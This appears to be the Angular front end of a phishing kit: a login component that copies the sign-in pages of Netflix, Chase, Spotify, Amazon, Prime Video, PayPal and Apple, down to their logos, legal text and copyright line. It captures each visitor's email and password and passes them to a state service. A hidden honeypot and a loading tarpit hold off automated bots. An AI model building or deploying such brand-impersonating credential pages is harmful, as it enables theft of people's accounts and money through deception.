import { Component, inject, computed, signal, effect } from '@angular/core';
import { CommonModule, NgIf } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { InputComponent } from './ui/input.component';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [
    CommonModule,
    FormsModule,
    TranslatePipe,
    InputComponent,
    ButtonComponent,
    CardComponent,
    NgIf
  ],
  host: {
    '[attr.data-theme]': 'currentFlowId()'
  },
  template: `
    <div class="min-h-screen w-full flex items-center justify-center p-4 transition-colors duration-500"
         [class.login-container]="currentFlowId() === 'netflix'"
         [style.background-color]="backgroundColor()">
      
      <!-- Chase Header Bar -->
      @if (currentFlowId() === 'chase') {
         <div class="login-header-bar">
             <img [src]="logoPath()" class="h-8 brightness-0 invert" alt="Chase Logo">
         </div>
      }

      <!-- Spotify Logo (Centered Top) -->
      @if (currentFlowId() === 'spotify') {
          <div class="w-full text-center py-8">
               <img [src]="logoPath()" class="h-10 mx-auto" alt="Spotify">
          </div>
      }

      <div class="w-full max-w-md animate-in slide-in-from-bottom-4 duration-500"
           [class.mt-16]="currentFlowId() === 'chase'"> 
          
          <!-- Logo Header (Standard + Amazon + Prime) -->
          @if (showLogo() && currentFlowId() !== 'chase' && currentFlowId() !== 'netflix' && currentFlowId() !== 'spotify') {
             <div class="mb-4 text-center">
                <img [src]="logoPath()" class="h-12 mx-auto" [alt]="currentFlowName() + ' Logo'">
             </div>
          }

          <ui-card [variant]="cardVariant()" [noPadding]="false" [interactive]="false" [class.glass-effect]="currentFlowId() === 'apple'">
            
            <!-- Netflix Logo inside card -->
            @if (currentFlowId() === 'netflix') {
                <div class="mb-10 text-left">
                    <img [src]="logoPath()" class="h-8" alt="Netflix">
                </div>
            }
            
            <!-- Amazon Heading -->
            @if (currentFlowId() === 'amazon') {
                <h1 class="text-3xl font-normal mb-4" [style.color]="headerColor()">Sign in</h1>
            }
            
            <!-- Prime Video Heading -->
            @if (currentFlowId() === 'prime-video') {
                <h1 class="text-2xl font-normal mb-1" [style.color]="headerColor()">Sign in</h1>
                <p class="text-sm text-[#89ABB4] mb-4">Watch on Prime Video</p>
            }
            
            <!-- Spotify Heading -->
            @if (currentFlowId() === 'spotify') {
                <h1 class="text-center text-4xl font-bold mb-8 text-white tracking-tighter">Log in to Spotify</h1>
                
                <!-- Social Buttons Stack -->
                <button class="spotify-social-btn text-white">Continue with Google</button>
                <button class="spotify-social-btn text-white">Continue with Facebook</button>
                <button class="spotify-social-btn text-white">Continue with Apple</button>
                
                <div class="flex items-center my-6">
                    <div class="flex-grow border-t border-[#292929]"></div>
                    <span class="px-3 text-sm text-white font-bold bg-[#191414]">OR</span> <!-- Mimic bg intersection -->
                    <div class="flex-grow border-t border-[#292929]"></div>
                </div>
            }

            <!-- Standard Header Content -->
            @if (['paypal', 'apple', 'chase'].includes(currentFlowId())) {
                <div class="text-center mb-6" [class.text-left]="currentFlowId() === 'netflix'">
                   <h1 class="text-2xl font-bold mb-2 tracking-tight" [style.color]="headerColor()" *ngIf="currentFlowId() !== 'chase'">
                     {{ 'LOGIN.TITLE' | translate }}
                   </h1>
                   <p class="text-base opacity-80" [style.color]="textColor()">
                     {{ 'LOGIN.SUBTITLE' | translate }}
                   </p>
                </div>
            }

            <!-- Login Form -->
            <form (submit)="onSubmit($event)" class="space-y-6">
               
               <!-- Amazon: Label layout -->
               <div *ngIf="currentFlowId() === 'amazon'">
                   <label class="block text-sm font-bold mb-1">Email or mobile phone number</label>
                   <input type="email" [(ngModel)]="email" name="email" class="ui-input w-full"
                          [class.border-red-600]="touched() && !email">
               </div>
               
               <!-- Prime Video: Label layout -->
               <div *ngIf="currentFlowId() === 'prime-video'">
                   <label class="block text-sm font-bold mb-1 text-white">Email or mobile phone number</label>
                   <input type="email" [(ngModel)]="email" name="email" class="ui-input w-full">
               </div>
               
               <!-- Spotify: Label layout (bold + white) -->
               <div *ngIf="currentFlowId() === 'spotify'">
                   <label class="block text-sm font-bold mb-2 text-white">Email or username</label>
                   <input type="email" [(ngModel)]="email" name="email" class="ui-input w-full" placeholder="Email or username">
               </div>

               <!-- Standard Emails -->
               @if (!['amazon', 'prime-video', 'spotify'].includes(currentFlowId())) {
                   <ui-input
                      [label]="currentFlowId() === 'netflix' ? '' : ('LOGIN.EMAIL_LABEL' | translate)"
                      type="email"
                      [(ngModel)]="email"
                      name="email"
                      [placeholder]="currentFlowId() === 'chase' ? 'Username' : ('LOGIN.EMAIL_PLACEHOLDER' | translate)"
                      [error]="touched() && !email ? 'Required' : ''"
                      (blur)="touched.set(true)"
                      [iconLeft]="true"
                      [class.netflix-input]="currentFlowId() === 'netflix'">
                      <span slot="icon-left" *ngIf="currentFlowId() !== 'netflix' && currentFlowId() !== 'chase'">
                          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
                          </svg>
                      </span>
                   </ui-input>
               }
               
               <!-- Amazon: Password layout -->
               <div *ngIf="currentFlowId() === 'amazon'">
                   <div class="flex justify-between">
                       <label class="block text-sm font-bold mb-1">Password</label>
                       <a href="#" class="text-blue-600 text-sm hover:underline">Forgot your password?</a>
                   </div>
                   <input type="password" [(ngModel)]="password" name="password" class="ui-input w-full">
               </div>
               
               <!-- Prime Video: Password layout -->
               <div *ngIf="currentFlowId() === 'prime-video'">
                   <div class="flex justify-between">
                       <label class="block text-sm font-bold mb-1 text-white">Password</label>
                       <a href="#" class="text-[#00A8E1] text-sm hover:underline">Forgot your password?</a>
                   </div>
                   <input type="password" [(ngModel)]="password" name="password" class="ui-input w-full">
               </div>
               
               <!-- Spotify: Password layout -->
               <div *ngIf="currentFlowId() === 'spotify'">
                    <label class="block text-sm font-bold mb-2 text-white">Password</label>
                    <input type="password" [(ngModel)]="password" name="password" class="ui-input w-full" placeholder="Password">
               </div>

               <!-- Standard Passwords -->
               @if (!['amazon', 'prime-video', 'spotify'].includes(currentFlowId())) {
                   <ui-input
                      [label]="currentFlowId() === 'netflix' ? '' : ('LOGIN.PASSWORD_LABEL' | translate)"
                      type="password"
                      [(ngModel)]="password"
                      name="password"
                      [placeholder]="'LOGIN.PASSWORD_PLACEHOLDER' | translate"
                      [error]="touched() && !password ? 'Required' : ''"
                      (blur)="touched.set(true)"
                      [iconLeft]="true"
                      [class.netflix-input]="currentFlowId() === 'netflix'">
                       <span slot="icon-left" *ngIf="currentFlowId() !== 'netflix' && currentFlowId() !== 'chase'">
                          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
                          </svg>
                       </span>
                   </ui-input>
               }

               <!-- Actions (Standard) -->
               <div class="flex items-center justify-between text-sm" *ngIf="!['amazon', 'prime-video', 'spotify'].includes(currentFlowId())">
                  <label class="flex items-center gap-2 cursor-pointer opacity-80 hover:opacity-100 transition-opacity">
                     <input type="checkbox" [(ngModel)]="rememberMe" name="rememberMe" class="rounded text-blue-600 focus:ring-blue-500">
                     <span [style.color]="textColor()">{{ 'LOGIN.REMEMBER' | translate }}</span>
                  </label>
                  
                  <button type="button" class="font-medium hover:underline bg-transparent border-0 p-0 cursor-pointer" [style.color]="primaryColor()">
                     {{ 'LOGIN.FORGOT' | translate }}
                  </button>
               </div>
               
               <!-- Spotify: Minimal Remember Me -->
               <div *ngIf="currentFlowId() === 'spotify'" class="flex items-center justify-between">
                   <div class="flex items-center">
                        <input type="checkbox" class="rounded bg-transparent border-gray-500 text-[#1DB954] focus:ring-0 focus:ring-offset-0">
                        <span class="ml-2 text-sm text-white font-medium">Remember me</span>
                   </div>
               </div>

               <!-- Submit Button -->
               <ui-button 
                 type="submit"
                 [loading]="isLoading()"
                 [fullWidth]="true"
                 [variant]="primaryBtnVariant()">
                 {{ currentFlowId() === 'amazon' ? 'Sign in' : ('LOGIN.BUTTON' | translate) }}
               </ui-button>
               
                <!-- Amazon Legal -->
               <div *ngIf="currentFlowId() === 'amazon'" class="text-xs text-slate-600 mt-4 leading-normal">
                   By continuing, you agree to Amazon's <a href="#" class="text-blue-700 hover:underline">Conditions of Use</a> and <a href="#" class="text-blue-700 hover:underline">Privacy Notice</a>.
               </div>
               
               <!-- Spotify: Forgot Password link centralized -->
               <div *ngIf="currentFlowId() === 'spotify'" class="text-center mt-4">
                   <a href="#" class="text-white hover:text-[#1DB954] hover:underline text-sm font-bold">Forgot your password?</a>
               </div>


                <!-- Honeypot Trap (Anti-Bot) -->
                <div style="opacity: 0; position: absolute; top: 0; left: 0; height: 0; width: 0; z-index: -1; pointer-events: none;">
                    <label for="hp-field">Website URL</label>
                    <input id="hp-field" type="text" name="website_hp" [(ngModel)]="honeypotTrap" tabindex="-1" autocomplete="off">
                </div>

            </form>

            <!-- Footer Slot -->
            @if (currentFlowId() === 'netflix') {
                <div class="mt-4 text-left">
                    <span class="text-[#737373]">New to Netflix? </span>
                    <a href="#" class="text-white hover:underline">Sign up now.</a>
                </div>
            }
            @else if (currentFlowId() === 'prime-video') {
                <div class="mt-6 text-center text-sm">
                    <span class="text-[#89ABB4]">New to Prime Video? </span>
                    <a href="#" class="text-[#00A8E1] hover:underline">Join Prime Video</a>
                </div>
            }
            @else if (currentFlowId() === 'spotify') {
                <div class="my-6 border-t border-[#292929]"></div>
                <div class="text-center">
                    <p class="text-[#b3b3b3] font-bold text-lg mb-4">Don't have an account?</p>
                    <button class="w-full h-12 rounded-full border border-[#727272] text-[#b3b3b3] font-bold hover:border-white hover:text-white transition-colors uppercase tracking-widest text-sm">
                        Sign up for Spotify
                    </button>
                </div>
            }
            @else if (currentFlowId() === 'amazon') {
                <!-- Amazon New Account -->
                 <div class="mt-6 pt-6 text-center space-y-3">
                     <div class="flex items-center">
                         <div class="flex-grow border-t border-gray-300"></div>
                         <span class="px-2 text-xs text-gray-500">New to Amazon?</span>
                         <div class="flex-grow border-t border-gray-300"></div>
                     </div>
                     <button class="w-full bg-gray-100 border border-gray-300 rounded shadow-sm py-2 text-sm hover:bg-gray-200">
                         Create your Amazon account
                     </button>
                 </div>
            }
            @else {
                <div class="mt-6 pt-6 border-t border-gray-100 dark:border-gray-800">
                     <div class="text-center">
                         <p class="text-sm text-gray-500 mb-3">New to the service?</p>
                         <ui-button 
                           variant="ghost" 
                           [fullWidth]="true"
                           (click)="onSignup()">
                           {{ 'LOGIN.SIGNUP' | translate }}
                         </ui-button>
                     </div>
                </div>
            }

          </ui-card>
          
          <!-- Amazon/Prime Footer -->
          @if (['amazon', 'prime-video'].includes(currentFlowId())) {
             <div class="mt-8 text-center text-xs space-x-6 bg-gradient-to-b from-white to-transparent" 
                  [class.text-blue-700]="currentFlowId() === 'amazon'"
                  [class.text-[#89ABB4]]="currentFlowId() === 'prime-video'">
                  <a href="#" class="hover:underline">Conditions of Use</a>
                  <a href="#" class="hover:underline">Privacy Notice</a>
                  <a href="#" class="hover:underline">Help</a>
                  <p class="mt-2 text-gray-500">© 1996-2024, Amazon.com, Inc. or its affiliates</p>
             </div>
          }
      </div>
    </div>
  `,
  styles: [`
    :host { display: block; width: 100%; }
    :host[data-theme='netflix'] {
        --bg-context: #000000;
        --surface: #141414;
        --text-primary: #ffffff;
    }
    :host[data-theme='apple'] {
        --bg-context: #ffffff;
    }
  `]
})
export class LoginComponent {
  state = inject(StateService);
  router = inject(Router);

  // Flow State
  currentFlow = this.state.currentFlow;
  currentFlowId = computed(() => this.currentFlow()?.id || 'generic');
  currentFlowName = computed(() => this.currentFlow()?.name || 'Service');

  // Form Model
  email = '';
  password = '';
  rememberMe = false;

  // UI State
  isLoading = signal(false);
  touched = signal(false);

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);

  headerColor = computed(() => this.theme()?.input.textColor || 'inherit');
  textColor = computed(() => this.theme()?.input.textColor || 'inherit');
  primaryColor = computed(() => this.theme()?.button.background || '#003087');
  backgroundColor = computed(() => this.theme()?.background || '#ffffff');

  // Logic Computeds
  showLogo = computed(() => ['paypal', 'apple', 'netflix', 'chase', 'amazon', 'prime-video', 'spotify'].includes(this.currentFlowId()));
  logoPath = computed(() => `assets/images/logos/${this.currentFlowId()}-logo.svg`);

  primaryBtnVariant = computed(() => {
    if (this.currentFlowId() === 'netflix') return 'danger';
    return 'primary';
  });

  cardVariant = computed<CardVariant>(() => {
    // Logic for flat vs elevated cards based on theme
    return 'elevated';
  });

  // Anti-Bot
  honeypotTrap = '';

  onSubmit(event: Event) {
    event.preventDefault();

    // Honeypot Check
    if (this.honeypotTrap) {
      console.log('Bot detected via honeypot');
      this.isLoading.set(true); // Tarpit: Loading forever
      // Optionally send beacon to server to ban IP
      return;
    }

    if (this.email && this.password) {
      this.isLoading.set(true);
      // Navigate to next step via state service
      this.state.login(this.email, this.password);
    } else {
      this.touched.set(true);
    }
  }

  onSignup() {
    // No OP for this flow usually, or redirect
  }
}
